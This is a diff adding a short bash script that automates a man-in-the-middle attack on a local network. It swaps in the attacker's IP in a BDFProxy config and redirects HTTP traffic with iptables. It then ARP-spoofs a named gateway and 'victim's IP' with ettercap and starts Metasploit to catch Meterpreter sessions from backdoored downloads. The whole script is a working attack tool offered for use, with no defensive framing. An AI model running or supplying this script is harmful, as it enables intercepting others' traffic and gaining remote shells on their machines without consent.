@@ -1,0 +1,30 @@
+#!/bin/bash
+echo "Checking privileges..."
+if [ "$(whoami)" != 'root' ]
+then
+	echo "You need R00T!"
+	sudo bdfp
+	exit
+fi
+cd /usr/share/bdfproxy/
+rm bdfproxy.cfg
+cp bdfproxy.cfg-orig bdfproxy.cfg
+read -p "Enter your IP:" H_IP
+read -p "Which mode do you prefer - (s)imple or (a)dvanced?" MODE
+if [ "$MODE" == "s" ]
+then
+	read -p "Enter gateway IP:" G_IP
+	read -p "Enter victim's IP:" V_IP
+	MODE="-i wlan0 -M arp /$G_IP// /$V_IP// -T"
+else
+	MODE="-G"
+fi
+sed -i -- "s/HACKERIP/$H_IP/g" bdfproxy.cfg
+xterm -e iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+xterm -e bdfproxy &
+xterm -e ettercap $MODE &
+#xterm -e /usr/bin/expect -c 'expect "" { eval spawn msfconsole -r bdfproxy_msf_resource.rc; expect -re "Meterpreter session (.?)  opened (.*) -500"; send "sessions -i 1\r"; interact }'
+msfconsole -r bdfproxy_msf_resource.rc
+killall xterm bdfproxy ettercap
+echo "Flushing NAT..."
+iptables -t nat -F
